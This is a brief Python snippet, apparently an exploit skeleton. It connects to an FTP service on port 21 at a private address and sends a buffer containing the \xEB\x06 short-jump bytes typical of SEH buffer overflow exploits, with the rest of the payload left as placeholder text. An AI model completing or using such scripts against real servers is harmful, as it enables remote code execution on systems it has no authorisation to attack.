import socket 

buffer = "something..\xEB\x06...something" 

s = socket.socket(socket.AF_INET,
				socket.SOCK_STREAM) 

conn = s.connect(('192.168.0.1', 21))

resp = s.recv(1024) 
s.send(buffer)
s.close() 
